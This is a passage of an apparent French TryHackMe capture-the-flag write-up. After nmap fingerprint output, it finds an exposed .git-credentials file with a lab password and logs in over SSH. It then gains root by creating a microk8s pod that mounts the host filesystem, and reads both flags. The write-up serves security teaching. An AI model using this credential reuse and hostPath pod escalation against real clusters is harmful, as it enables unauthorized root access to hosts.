SF:tent-Security-Policy:\x20default-src\x20'self'\x20;\x20connect-src\x20\
SF:*;\x20font-src\x20'self'\x20\x20data:;\x20frame-src\x20\*;\x20img-src\x
SF:20\*\x20data:;\x20media-src\x20\*\x20data:;\x20script-src\x20'self'\x20
SF:'unsafe-eval'\x20;\x20style-src\x20'self'\x20'unsafe-inline'\x20\r\nX-I
SF:nstance-ID:\x20ei69Tx9poNnA3S7QB\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nVary:\x20Accept-Encoding\r\nDate:\x20Sat,\x2006\x20Nov\x20
SF:2021\x2010:09:33\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n<html>\n<head>\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/
SF:css\"\x20class=\"__meteor-css__\"\x20href=\"/a3e89fa2bdd3f98d52e474085b
SF:b1d61f99c0684d\.css\?meteor_css_resource=true\">\n<meta\x20charset=\"ut
SF:f-8\"\x20/>\n\t<meta\x20http-equiv=\"content-type\"\x20content=\"text/h
SF:tml;\x20charset=utf-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20con
SF:tent=\"-1\"\x20/>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content
SF:=\"IE=edge\"\x20/>\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x20/>
SF:\n\t<meta\x20name=\"distribution\"\x20content")%r(HTTPOptions,31C4,"HTT
SF:P/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-Frame-Options:\x20sameorigin\r\nContent-Security-Poli
SF:cy:\x20default-src\x20'self'\x20;\x20connect-src\x20\*;\x20font-src\x20
SF:'self'\x20\x20data:;\x20frame-src\x20\*;\x20img-src\x20\*\x20data:;\x20
SF:media-src\x20\*\x20data:;\x20script-src\x20'self'\x20'unsafe-eval'\x20;
SF:\x20style-src\x20'self'\x20'unsafe-inline'\x20\r\nX-Instance-ID:\x20ei6
SF:9Tx9poNnA3S7QB\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nVary:
SF:\x20Accept-Encoding\r\nDate:\x20Sat,\x2006\x20Nov\x202021\x2010:09:33\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>
SF:\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/css\"\x20class=\"_
SF:_meteor-css__\"\x20href=\"/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d\.cs
SF:s\?meteor_css_resource=true\">\n<meta\x20charset=\"utf-8\"\x20/>\n\t<me
SF:ta\x20http-equiv=\"content-type\"\x20content=\"text/html;\x20charset=ut
SF:f-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20content=\"-1\"\x20/>\
SF:n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\"\x20/>
SF:\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x20/>\n\t<meta\x20name=
SF:\"distribution\"\x20content");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port10257-TCP:V=7.92%T=SSL%I=7%D=11/6%Time=61865464%P=x86_64-pc-linux-g
SF:nu%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(GetRequest,170,"HTTP/1\.0\x20403\x20Forbidden\r\nC
SF:ache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20application/j
SF:son\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sat,\x2006\x20Nov
SF:\x202021\x2010:09:39\x20GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":
SF:\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\"
SF:,\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20cannot
SF:\x20get\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},
SF:\"code\":403}\n")%r(HTTPOptions,174,"HTTP/1\.0\x20403\x20Forbidden\r\nC
SF:ache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20application/j
SF:son\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sat,\x2006\x20Nov
SF:\x202021\x2010:09:40\x20GMT\r\nContent-Length:\x20189\r\n\r\n{\"kind\":
SF:\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\"
SF:,\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20cannot
SF:\x20options\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\"
SF::{},\"code\":403}\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Termina
SF:lServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
SF:\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
SF:on:\x20close\r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port10259-TCP:V=7.92%T=SSL%I=7%D=11/6%Time=61865464%P=x86_64-pc-linux-g
SF:nu%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(GetRequest,170,"HTTP/1\.0\x20403\x20Forbidden\r\nC
SF:ache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20application/j
SF:son\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sat,\x2006\x20Nov
SF:\x202021\x2010:09:39\x20GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":
SF:\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\"
SF:,\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20cannot
SF:\x20get\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},
SF:\"code\":403}\n")%r(HTTPOptions,174,"HTTP/1\.0\x20403\x20Forbidden\r\nC
SF:ache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20application/j
SF:son\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sat,\x2006\x20Nov
SF:\x202021\x2010:09:40\x20GMT\r\nContent-Length:\x20189\r\n\r\n{\"kind\":
SF:\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\"
SF:,\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20cannot
SF:\x20options\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\"
SF::{},\"code\":403}\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Termina
SF:lServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
SF:\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
SF:on:\x20close\r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port16443-TCP:V=7.92%T=SSL%I=7%D=11/6%Time=61865464%P=x86_64-pc-linux-g
SF:nu%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(GetRequest,11A,"HTTP/1\.0\x20401\x20Unauthorized\r
SF:\nCache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20applicatio
SF:n/json\r\nDate:\x20Sat,\x2006\x20Nov\x202021\x2010:09:39\x20GMT\r\nCont
SF:ent-Length:\x20129\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"
SF:metadata\":{},\"status\":\"Failure\",\"message\":\"Unauthorized\",\"rea
SF:son\":\"Unauthorized\",\"code\":401}\n")%r(HTTPOptions,11A,"HTTP/1\.0\x
SF:20401\x20Unauthorized\r\nCache-Control:\x20no-cache,\x20private\r\nCont
SF:ent-Type:\x20application/json\r\nDate:\x20Sat,\x2006\x20Nov\x202021\x20
SF:10:09:40\x20GMT\r\nContent-Length:\x20129\r\n\r\n{\"kind\":\"Status\",\
SF:"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\"
SF::\"Unauthorized\",\"reason\":\"Unauthorized\",\"code\":401}\n")%r(RTSPR
SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-
SF:8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionRe
SF:q,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
SF:")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(FourOhFourRequest,11A,"HTTP/1\.0\x20401\x20Unauthorize
SF:d\r\nCache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20applica
SF:tion/json\r\nDate:\x20Sat,\x2006\x20Nov\x202021\x2010:10:06\x20GMT\r\nC
SF:ontent-Length:\x20129\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\"
SF:,\"metadata\":{},\"status\":\"Failure\",\"message\":\"Unauthorized\",\"
SF:reason\":\"Unauthorized\",\"code\":401}\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/6%OT=22%CT=1%CU=34757%PV=Y%DS=2%DC=T%G=Y%TM=618654C
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
OS:1NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   34.33 ms 10.9.0.1
2   34.68 ms frank.thm (10.10.203.102)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 163.17 seconds
UALLY)==============
SF-Port16443-TCP:V=7.92%T=SSL%I=7%D=11/6%Time=61865464%P=x86_64-pc-linux-g
SF:nu%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(GetRequest,11A,"HTTP/1\.0\x20401\x20Unauthorized\r
SF:\nCache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20applicatio
SF:n/json\r\nDate:\x20Sat,\x2006\x20Nov\x202021\x2010:09:39\x20GMT\r\nCont
SF:ent-Length:\x20129\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"
SF:metadata\":{},\"status\":\"Failure\",\"message\":\"Unauthorized\",\"rea
SF:son\":\"Unauthorized\",\"code\":401}\n")%r(HTTPOptions,11A,"HTTP/1\.0\x
SF:20401\x20Unauthorized\r\nCache-Control:\x20no-cache,\x20private\r\nCont
SF:ent-Type:\x20application/json\r\nDate:\x20Sat,\x2006\x20Nov\x202021\x20
SF:10:09:40\x20GMT\r\nContent-Length:\x20129\r\n\r\n{\"kind\":\"Status\",\
SF:"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\"
SF::\"Unauthorized\",\"reason\":\"Unauthorized\",\"code\":401}\n")%r(RTSPR
SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-
SF:8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionRe
SF:q,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
SF:")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(FourOhFourRequest,11A,"HTTP/1\.0\x20401\x20Unauthorize
SF:d\r\nCache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20applica
SF:tion/json\r\nDate:\x20Sat,\x2006\x20Nov\x202021\x2010:10:06\x20GMT\r\nC
SF:ontent-Length:\x20129\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\"
SF:,\"metadata\":{},\"status\":\"Failure\",\"message\":\"Unauthorized\",\"
SF:reason\":\"Unauthorized\",\"code\":401}\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/6%OT=22%CT=1%CU=34757%PV=Y%DS=2%DC=T%G=Y%TM=618654C
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
OS:1NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   34.33 ms 10.9.0.1
2   34.68 ms frank.thm (10.10.203.102)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 163.17 seconds
```

**What port has a webpage frank was able to stand up?**

On voit plus de services.   
Sur le port 31337 on voit que c'est un site web.  

Le port de la page internet de frank est 31337.   

![page](./Task1-01.png)  
Dans le site web il y pas grand chose.  

**What did frank leave exposed on the site?**


```bash
tim@kali:~/Bureau/tryhackme$ dirsearch -u http://kubernetes:31337/

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877

Output File: /home/tim/.dirsearch/reports/kubernetes/_21-11-06_11-18-25.txt

Error Log: /home/tim/.dirsearch/logs/errors-21-11-06_11-18-25.log

Target: http://kubernetes:31337/

[11:18:25] Starting: 
[11:18:27] 200 -   50B  - /.git-credentials
[11:18:33] 301 -  169B  - /assets  ->  http://kubernetes/assets/
[11:18:33] 403 -  555B  - /assets/
[11:18:36] 301 -  169B  - /css  ->  http://kubernetes/css/
[11:18:43] 200 -    5KB - /index.html
[11:18:59] 403 -  555B  - /vendor/

Task Completed
```

dirsearch nous trouve un fichier .git-credentials   

Frank a laissé le fichier .git-credentials exposé.  

```bash
tim@kali:~/Bureau/tryhackme$ wget http://kubernetes:31337/.git-credentials -nv
2021-11-06 11:23:38 URL:http://kubernetes:31337/.git-credentials [50/50] -> ".git-credentials" [1]

tim@kali:~/Bureau/tryhackme$ cat .git-credentials 
http://frank:f%40an3-1s-E337%21%21@192.168.100.50

tim@kali:~/Bureau/tryhackme$ urlencode -d f%40an3-1s-E337%21%21
f@an3-1s-E337!!
```

Dans le fichier .git-crendentials on trouve des identifiants qui sont : frank:f@an3-1s-E337!!




tim@kali:~/Bureau/tryhackme/write-up$ cat git-credentials 
http://frank:f%40an3-1s-E337%21%21@192.168.100.50
f@an3-1s-E337!!

**What is the user.txt flag?**


```bash
tim@kali:~/Bureau/tryhackme$ pwncat_ssh frank kubernetes
pwncat frank@kubernetes
[11:30:24] Welcome to pwncat 🐈!                                                                                                                                                                                               __main__.py:153
Password: ***************
[11:30:29] kubernetes:22: registered new host w/ db                                                                                                                                                                             manager.py:504
(local) pwncat$                                                                                                                                                                                                                               
(remote) frank@dev-01:/home/frank$ ls user.txt 
user.txt
(remote) frank@dev-01:/home/frank$ cat user.txt 
THM{F@nkth3T@nk}
```

On seconnecte sur le service SSH avec les identifiants de frank.  
On lit le fichier user.txt et on a le flag.  
Le flag est : THM{F@nkth3T@nk}   

**What is the root.txt flag?**

```bash
(remote) frank@dev-01:/home/frank$ id
uid=1001(frank) gid=1001(frank) groups=1001(frank),998(microk8s)

(remote) frank@dev-01:/home/frank$ alias k='microk8s.kubectl'

(remote) frank@dev-01:/home/frank$ k get pods
NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment-7b548976fd-77v4r   1/1     Running   2          9d

```

On remarque que frank appartient au groupe microk8s.   
On fait un alias pour éviter de taper toute la commande à chaque fois.

On voit qu'il a un pot qui existe sur notre machine cible.   

```bash
(remote) frank@dev-01:/home/frank$ k get pods --all-namespaces -o jsonpath="{.items[*].spec.containers[*].image}"
cdkbot/registry-amd64:2.6 cdkbot/hostpath-provisioner-amd64:1.0.0 localhost:32000/bsnginx calico/node:v3.13.2 coredns/coredns:1.8.0 calico/kube-controllers:v3.13.2
```

On récupère des informations sur le pods qui existe déjà.
On voit que l'image du pods est : localhost:32000/bsnginx.   

```bash
(remote) frank@dev-01:/home/frank$ cat pod.yaml 
apiVersion: v1
kind: Pod
metadata:
  name: hostmount
spec:
  containers:
  - name: shell
    image: localhost:32000/bsnginx
    imagePullPolicy: Never
    command:
      - "/bin/bash"
      - "-c"
      - "sleep 10000"
    volumeMounts:
      - name: root
        mountPath: /opt/root
  volumes:
  - name: root
    hostPath:
      path: /
      type: Directory
```

On va creer un pod qui va nous monter le répertoire racine dans /opt/root.
Comme on a pas internet sur la machine on réutiliser l'image bsnginx qui existe déjà.  
Quand on se connecte à l'interieur d'un pod on est administrateur donc on pourra lire notre fichier root.   

```bash
(remote) frank@dev-01:/home/frank$ k apply -f pod.yaml 
pod/hostmount created
```

On crée le pod. 

```bash
(remote) frank@dev-01:/home/frank$ k exec -it hostmount /bin/bash
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
root@hostmount:/# cat /opt/root/root/root.txt 
THM{M1cr0K8s_13_FUN}
```

On se connecte à notre pods et on lit le fichier root.txt dans /opt/root/root/root.txt.  
Le flag est : THM{M1cr0K8s_13_FUN}    

